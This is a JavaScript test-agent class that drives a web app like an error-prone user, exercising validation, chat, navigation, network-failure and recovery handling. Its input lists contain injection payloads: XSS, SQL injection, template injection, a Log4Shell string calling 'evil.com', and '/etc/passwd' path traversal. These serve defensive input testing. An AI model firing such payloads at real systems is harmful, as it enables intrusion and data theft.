const UserAgentBase = require('./user-agent-base');

/**
 * Simulates an error-prone user who makes common mistakes
 * Focuses on testing error handling, validation, and recovery workflows
 */
class ErrorProneAgent extends UserAgentBase {
  constructor(options = {}) {
    super({
      ...options,
      behavior: 'error-prone',
      speed: options.speed || 'normal',
      errorProne: true
    });
    
    this.errorPatterns = {
      triggeredErrors: new Set(),
      recoveryAttempts: new Set(),
      validationErrors: new Set(),
      networkErrors: new Set(),
      userErrors: new Set()
    };
  }

  /**
   * Main execution flow for error-prone user behavior
   */
  async execute(page) {
    this.logAction('error_prone_session_start');
    
    try {
      // Input validation errors
      await this.triggerInputValidationErrors(page);
      
      // Form submission errors
      await this.triggerFormErrors(page);
      
      // Chat input errors
      await this.triggerChatErrors(page);
      
      // Navigation errors
      await this.triggerNavigationErrors(page);
      
      // Network simulation errors
      await this.simulateNetworkIssues(page);
      
      // Recovery workflows
      await this.testErrorRecovery(page);
      
      this.logAction('error_prone_session_complete', {
        triggeredErrors: this.errorPatterns.triggeredErrors.size,
        recoveryAttempts: this.errorPatterns.recoveryAttempts.size,
        errorTypes: {
          validation: this.errorPatterns.validationErrors.size,
          network: this.errorPatterns.networkErrors.size,
          user: this.errorPatterns.userErrors.size
        }
      });
      
    } catch (error) {
      this.logError(error, { phase: 'error_prone_testing' });
      // Don't rethrow - this is expected behavior for error testing
    }
  }

  /**
   * Trigger input validation errors
   */
  async triggerInputValidationErrors(page) {
    this.logAction('triggering_input_validation_errors');
    
    const validationTests = [
      {
        name: 'empty_required_fields',
        test: async () => await this.testEmptyRequiredFields(page)
      },
      {
        name: 'invalid_email_format',
        test: async () => await this.testInvalidEmailFormat(page)
      },
      {
        name: 'invalid_number_inputs',
        test: async () => await this.testInvalidNumberInputs(page)
      },
      {
        name: 'special_characters',
        test: async () => await this.testSpecialCharacters(page)
      },
      {
        name: 'max_length_exceeded',
        test: async () => await this.testMaxLengthExceeded(page)
      }
    ];

    for (const testCase of validationTests) {
      try {
        await testCase.test();
        this.errorPatterns.triggeredErrors.add(testCase.name);
        this.errorPatterns.validationErrors.add(testCase.name);
      } catch (error) {
        this.logError(error, { testCase: testCase.name });
      }
    }
  }

  /**
   * Test empty required fields
   */
  async testEmptyRequiredFields(page) {
    // Go to settings page with forms
    await page.goto('/settings');
    await this.waitForPageStability(page);
    
    const requiredInputs = page.locator('input[required], input[aria-required="true"]');
    const submitButtons = page.locator('button[type="submit"], button:has-text("Save")');
    
    if (await requiredInputs.count() > 0 && await submitButtons.count() > 0) {
      // Clear required fields
      const inputCount = await requiredInputs.count();
      for (let i = 0; i < Math.min(inputCount, 3); i++) {
        const input = requiredInputs.nth(i);
        await input.fill('');
      }
      
      // Try to submit
      await this.humanClick(page, submitButtons.first());
      await page.waitForTimeout(1000);
      
      // Look for validation messages
      const validationMessages = page.locator('.error, [role="alert"], .validation-error, text*="required"');
      if (await validationMessages.count() > 0) {
        this.logAction('validation_error_triggered', { type: 'empty_required_fields' });
      }
    }
  }

  /**
   * Test invalid email format
   */
  async testInvalidEmailFormat(page) {
    const emailInputs = page.locator('input[type="email"], input[placeholder*="email"]');
    
    if (await emailInputs.count() > 0) {
      const invalidEmails = [
        'invalid-email',
        '@domain.com',
        'user@',
        'user.domain',
        'user@domain.',
        'spaces in@email.com'
      ];
      
      const email = this.getRandomElement(invalidEmails);
      await this.typeHumanLike(page, emailInputs.first(), email);
      
      // Try to submit or move focus
      await page.keyboard.press('Tab');
      await page.waitForTimeout(500);
      
      // Check for validation
      const validationMessages = page.locator('.error, [role="alert"], text*="valid email"');
      if (await validationMessages.count() > 0) {
        this.logAction('validation_error_triggered', { type: 'invalid_email', email });
      }
    }
  }

  /**
   * Test invalid number inputs
   */
  async testInvalidNumberInputs(page) {
    const numberInputs = page.locator('input[type="number"], input[inputmode="numeric"]');
    
    if (await numberInputs.count() > 0) {
      const invalidNumbers = [
        'abc',
        '12.34.56',
        '1e10000',
        '-999999',
        'NaN',
        'Infinity'
      ];
      
      const invalidValue = this.getRandomElement(invalidNumbers);
      await numberInputs.first().fill(invalidValue);
      await page.keyboard.press('Tab');
      await page.waitForTimeout(500);
      
      this.logAction('invalid_number_input', { value: invalidValue });
    }
  }

  /**
   * Test special characters in text inputs
   */
  async testSpecialCharacters(page) {
    const textInputs = page.locator('input[type="text"], textarea');
    
    if (await textInputs.count() > 0) {
      const specialCharStrings = [
        '<script>alert("xss")</script>',
        "\\'); DROP TABLE users; --",
        '{{7*7}}',
        '${jndi:ldap://evil.com/a}',
        '\\x00\\x01\\x02',
        '🚀💥🔥' + 'a'.repeat(1000)
      ];
      
      const specialString = this.getRandomElement(specialCharStrings);
      await this.typeHumanLike(page, textInputs.first(), specialString);
      await page.keyboard.press('Tab');
      
      this.logAction('special_characters_input', { input: specialString.substring(0, 100) });
    }
  }

  /**
   * Test max length exceeded
   */
  async testMaxLengthExceeded(page) {
    const inputsWithMaxLength = page.locator('input[maxlength], textarea[maxlength]');
    
    if (await inputsWithMaxLength.count() > 0) {
      const input = inputsWithMaxLength.first();
      const maxLength = parseInt(await input.getAttribute('maxlength') || '100');
      const exceedingText = 'a'.repeat(maxLength + 50);
      
      await input.fill(exceedingText);
      await page.keyboard.press('Tab');
      
      this.logAction('max_length_exceeded', { maxLength, actualLength: exceedingText.length });
    }
  }

  /**
   * Trigger form submission errors
   */
  async triggerFormErrors(page) {
    this.logAction('triggering_form_errors');
    
    // Test incomplete form submissions
    await this.testIncompleteFormSubmission(page);
    
    // Test rapid form submissions
    await this.testRapidFormSubmission(page);
    
    // Test form submission with invalid data combinations
    await this.testInvalidDataCombinations(page);
  }

  /**
   * Test incomplete form submission
   */
  async testIncompleteFormSubmission(page) {
    await page.goto('/settings');
    await this.waitForPageStability(page);
    
    const forms = page.locator('form');
    if (await forms.count() > 0) {
      const form = forms.first();
      const inputs = form.locator('input, textarea, select');
      const submitButton = form.locator('button[type="submit"], input[type="submit"]');
      
      if (await inputs.count() > 0 && await submitButton.count() > 0) {
        // Fill only some fields randomly
        const inputCount = await inputs.count();
        const fieldsToFill = Math.floor(inputCount / 2);
        
        for (let i = 0; i < fieldsToFill; i++) {
          const input = inputs.nth(i);
          const inputType = await input.getAttribute('type') || 'text';
          
          if (inputType === 'text' || inputType === 'email') {
            await this.typeHumanLike(page, input, faker.lorem.word());
          }
        }
        
        // Submit incomplete form
        await this.humanClick(page, submitButton.first());
        await page.waitForTimeout(1000);
        
        this.errorPatterns.userErrors.add('incomplete_form_submission');
      }
    }
  }

  /**
   * Test rapid form submission
   */
  async testRapidFormSubmission(page) {
    const submitButtons = page.locator('button[type="submit"], button:has-text("Save"), button:has-text("Submit")');
    
    if (await submitButtons.count() > 0) {
      const button = submitButtons.first();
      
      // Click rapidly multiple times
      for (let i = 0; i < 3; i++) {
        await this.humanClick(page, button);
        await page.waitForTimeout(100);
      }
      
      this.errorPatterns.userErrors.add('rapid_form_submission');
      this.logAction('rapid_form_submission_attempted');
    }
  }

  /**
   * Test invalid data combinations
   */
  async testInvalidDataCombinations(page) {
    // Test date ranges where start > end
    const dateInputs = page.locator('input[type="date"], input[type="datetime-local"]');
    const dateCount = await dateInputs.count();
    
    if (dateCount >= 2) {
      // Set end date before start date
      await dateInputs.nth(0).fill('2024-12-31');
      await dateInputs.nth(1).fill('2024-01-01');
      
      this.errorPatterns.validationErrors.add('invalid_date_range');
      this.logAction('invalid_date_range_entered');
    }
  }

  /**
   * Trigger chat-specific errors
   */
  async triggerChatErrors(page) {
    this.logAction('triggering_chat_errors');
    
    await page.goto('/chat');
    await this.waitForPageStability(page);
    
    const chatInput = page.locator('textarea, input[placeholder*="chat"], [data-testid="chat-input"]');
    const sendButton = page.locator('button[type="submit"], button:has-text("Send")');
    
    if (await chatInput.count() > 0 && await sendButton.count() > 0) {
      // Test empty message submission
      await this.testEmptyMessageSubmission(page, chatInput, sendButton);
      
      // Test extremely long messages
      await this.testExtremelyLongMessages(page, chatInput, sendButton);
      
      // Test rapid message sending
      await this.testRapidMessageSending(page, chatInput, sendButton);
      
      // Test malformed commands
      await this.testMalformedCommands(page, chatInput, sendButton);
    }
  }

  /**
   * Test empty message submission
   */
  async testEmptyMessageSubmission(page, chatInput, sendButton) {
    await chatInput.fill('');
    await this.humanClick(page, sendButton.first());
    
    this.errorPatterns.userErrors.add('empty_message_submission');
    this.logAction('empty_message_submission_attempted');
  }

  /**
   * Test extremely long messages
   */
  async testExtremelyLongMessages(page, chatInput, sendButton) {
    const longMessage = 'This is a very long message. '.repeat(500);
    await chatInput.fill(longMessage);
    await this.humanClick(page, sendButton.first());
    
    this.errorPatterns.userErrors.add('extremely_long_message');
    this.logAction('extremely_long_message_sent', { length: longMessage.length });
  }

  /**
   * Test rapid message sending
   */
  async testRapidMessageSending(page, chatInput, sendButton) {
    const rapidMessages = [
      'Message 1',
      'Message 2', 
      'Message 3',
      'Message 4'
    ];
    
    for (const message of rapidMessages) {
      await chatInput.fill(message);
      await this.humanClick(page, sendButton.first());
      await page.waitForTimeout(50); // Very short delay
    }
    
    this.errorPatterns.userErrors.add('rapid_message_sending');
    this.logAction('rapid_message_sending_attempted', { messageCount: rapidMessages.length });
  }

  /**
   * Test malformed commands
   */
  async testMalformedCommands(page, chatInput, sendButton) {
    const malformedCommands = [
      '/command with spaces and (special) characters!',
      'SELECT * FROM users WHERE 1=1; --',
      '{{constructor.constructor("return process")().exit()}}',
      'javascript:alert("xss")',
      'file:///etc/passwd',
      '<img src=x onerror=alert(1)>'
    ];
    
    for (const command of malformedCommands.slice(0, 2)) {
      await chatInput.fill(command);
      await this.humanClick(page, sendButton.first());
      await page.waitForTimeout(1000);
    }
    
    this.errorPatterns.userErrors.add('malformed_commands');
    this.logAction('malformed_commands_sent');
  }

  /**
   * Trigger navigation errors
   */
  async triggerNavigationErrors(page) {
    this.logAction('triggering_navigation_errors');
    
    // Test direct navigation to non-existent pages
    const invalidPages = [
      '/nonexistent',
      '/admin',
      '/api/internal',
      '/dashboard/../../../etc/passwd',
      '/chat?page="><script>alert(1)</script>'
    ];
    
    for (const invalidPage of invalidPages.slice(0, 2)) {
      try {
        await page.goto(invalidPage);
        await page.waitForTimeout(2000);
        
        // Check for 404 or error pages
        const errorIndicators = page.locator('text*="404", text*="Not Found", text*="Error", [data-testid="error"]');
        if (await errorIndicators.count() > 0) {
          this.logAction('navigation_error_found', { page: invalidPage });
        }
        
      } catch (error) {
        this.logError(error, { invalidPage });
      }
    }
    
    this.errorPatterns.userErrors.add('invalid_navigation');
  }

  /**
   * Simulate network issues
   */
  async simulateNetworkIssues(page) {
    this.logAction('simulating_network_issues');
    
    try {
      // Simulate slow network
      await page.route('**/*', async (route) => {
        await new Promise(resolve => setTimeout(resolve, 5000)); // 5 second delay
        await route.continue();
      });
      
      await page.goto('/dashboard');
      await page.waitForTimeout(2000);
      
      // Remove route handler
      await page.unroute('**/*');
      
      this.errorPatterns.networkErrors.add('slow_network');
      
      // Simulate network failures
      await page.route('**/api/**', (route) => {
        route.abort('failed');
      });
      
      await page.reload();
      await page.waitForTimeout(3000);
      
      // Remove route handler
      await page.unroute('**/api/**');
      
      this.errorPatterns.networkErrors.add('network_failure');
      
    } catch (error) {
      this.logError(error, { context: 'network_simulation' });
    }
  }

  /**
   * Test error recovery workflows
   */
  async testErrorRecovery(page) {
    this.logAction('testing_error_recovery');
    
    // Test page refresh recovery
    await this.testPageRefreshRecovery(page);
    
    // Test form resubmission
    await this.testFormResubmission(page);
    
    // Test retry mechanisms
    await this.testRetryMechanisms(page);
  }

  /**
   * Test page refresh recovery
   */
  async testPageRefreshRecovery(page) {
    await page.goto('/chat');
    await this.waitForPageStability(page);
    
    // Interact with the page first
    const chatInput = page.locator('textarea, input[placeholder*="chat"]');
    if (await chatInput.count() > 0) {
      await this.typeHumanLike(page, chatInput, 'Test message before refresh');
    }
    
    // Refresh the page
    await page.reload();
    await this.waitForPageStability(page);
    
    // Try to continue using the page
    if (await chatInput.count() > 0) {
      await this.typeHumanLike(page, chatInput, 'Test message after refresh');
    }
    
    this.errorPatterns.recoveryAttempts.add('page_refresh_recovery');
    this.logAction('page_refresh_recovery_tested');
  }

  /**
   * Test form resubmission
   */
  async testFormResubmission(page) {
    await page.goto('/settings');
    await this.waitForPageStability(page);
    
    const forms = page.locator('form');
    if (await forms.count() > 0) {
      const form = forms.first();
      const submitButton = form.locator('button[type="submit"]');
      
      if (await submitButton.count() > 0) {
        // Submit form multiple times
        await this.humanClick(page, submitButton.first());
        await page.waitForTimeout(1000);
        
        // Try submitting again
        await this.humanClick(page, submitButton.first());
        await page.waitForTimeout(1000);
        
        this.errorPatterns.recoveryAttempts.add('form_resubmission');
        this.logAction('form_resubmission_tested');
      }
    }
  }

  /**
   * Test retry mechanisms
   */
  async testRetryMechanisms(page) {
    // Look for retry buttons or mechanisms
    const retryButtons = page.locator('button:has-text("Retry"), button:has-text("Try Again"), [data-testid="retry"]');
    
    if (await retryButtons.count() > 0) {
      await this.humanClick(page, retryButtons.first());
      await page.waitForTimeout(2000);
      
      this.errorPatterns.recoveryAttempts.add('retry_mechanism');
      this.logAction('retry_mechanism_tested');
    }
  }

  /**
   * Get error testing summary
   */
  getErrorTestingSummary() {
    return {
      agentId: this.id,
      behavior: this.behavior,
      errorPatterns: {
        triggeredErrors: Array.from(this.errorPatterns.triggeredErrors),
        recoveryAttempts: Array.from(this.errorPatterns.recoveryAttempts),
        validationErrors: Array.from(this.errorPatterns.validationErrors),
        networkErrors: Array.from(this.errorPatterns.networkErrors),
        userErrors: Array.from(this.errorPatterns.userErrors)
      },
      errorHandlingScore: this.calculateErrorHandlingScore()
    };
  }

  /**
   * Calculate error handling score
   */
  calculateErrorHandlingScore() {
    const totalErrors = this.errorPatterns.triggeredErrors.size;
    const successfulRecoveries = this.errorPatterns.recoveryAttempts.size;
    
    if (totalErrors === 0) return 0;
    
    return Math.round((successfulRecoveries / totalErrors) * 100);
  }
}

module.exports = ErrorProneAgent;